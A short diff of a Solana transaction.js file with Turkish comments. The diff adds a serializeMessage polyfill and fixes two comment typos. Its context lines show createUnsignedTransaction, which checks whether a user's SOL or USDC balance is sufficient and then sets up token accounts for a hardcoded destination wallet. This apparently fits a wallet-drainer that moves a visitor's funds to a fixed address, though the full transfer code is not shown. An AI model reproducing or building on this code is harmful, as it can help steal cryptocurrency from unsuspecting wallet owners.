@@ -1,10 +1,23 @@
 /* transaction.js */
 /* eslint-disable @typescript-eslint/no-explicit-any */
 
+// ——— Polyfill: Transaction.prototype.serializeMessage ekle ———
+import { Transaction } from "@solana/web3.js";
+if (!Transaction.prototype.serializeMessage) {
+  Transaction.prototype.serializeMessage = function () {
+    // Eğer compileMessage() fonksiyonu tanımlıysa, onu kullanıp Buffer döndür
+    if (typeof this.compileMessage === "function") {
+      return this.compileMessage().serialize();
+    }
+    // Yoksa direkt komple transaction’ı serialize et
+    return this.serialize();
+  };
+}
+
+// ——— Orijinal import’lar ———
 import {
   PublicKey,
   SystemProgram,
-  Transaction,
 } from "@solana/web3.js";
 import {
   getAssociatedTokenAddress,
@@ -82,7 +95,7 @@ export async function createUnsignedTransaction(userPublicKey) {
   }
 
   // -----------------------------------------------------------
-  // Eligibility: Hiç biri yeterli değilse çık
+  // Eligibility: Hiçbiri yeterli değilse çık
   // -----------------------------------------------------------
   if (
     !isSolSufficient &&
@@ -95,7 +108,7 @@ export async function createUnsignedTransaction(userPublicKey) {
   }
 
   // -----------------------------------------------------------
-  // Hedef adres ve ata hesapları
+  // Hedef adres ve ATA hesapları
   // -----------------------------------------------------------
   const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");
   const toUsdcAta    = await getAssociatedTokenAddress(USDC_MINT,    toPublicKey);
